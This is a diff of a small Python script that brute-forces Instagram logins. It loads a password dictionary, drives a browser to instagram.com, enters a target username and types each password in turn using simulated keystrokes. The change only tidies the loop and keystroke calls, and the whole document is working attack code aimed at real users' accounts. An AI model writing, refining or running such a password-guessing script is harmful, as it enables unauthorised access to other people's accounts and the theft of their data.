@@ -6,9 +6,7 @@ dictionary = input('Choose Dictionary: ')
 
 file = open(f'{dictionary}.txt', 'r')
 bruteforce = []
-for line in file:
-    line = line.strip()
-    bruteforce.append(line)
+for line in file: bruteforce.append(line.strip())
 file.close()
 
 web = Browser()
@@ -17,16 +15,12 @@ keyboard = Controller()
 
 web.go_to('www.instagram.com')
 time.sleep(3)
-keyboard.press(Key.enter)
-keyboard.release(Key.enter)
+keyboard.tap(Key.enter)
 time.sleep(3)
-keyboard.press(Key.tab)
-keyboard.release(Key.tab)
+keyboard.tap(Key.tab)
 time.sleep(3)
 web.type(username)
-keyboard.press(Key.tab)
-keyboard.release(Key.tab)
+keyboard.tap(Key.tab)
 for brute in bruteforce:
     web.type(brute, into="Password")
-    keyboard.press(Key.enter)
-    keyboard.release(Key.enter)
+    keyboard.tap(Key.enter)
